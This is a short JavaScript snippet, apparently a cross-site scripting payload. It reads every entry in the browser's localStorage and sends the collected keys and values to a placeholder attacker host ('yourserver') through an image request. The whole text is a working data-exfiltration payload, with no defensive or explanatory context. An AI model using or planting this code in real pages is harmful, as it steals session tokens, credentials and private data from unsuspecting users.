let i = 0;
let storage = "";
let img = new Image();

while (localStorage.key(i) != null)
{
  let key = localStorage.key(i);
  storage += key + ": " + localStorage.getItem(key) + '\n';
  i++;
}

img.src = "https://yourserver/?storage=" + storage;
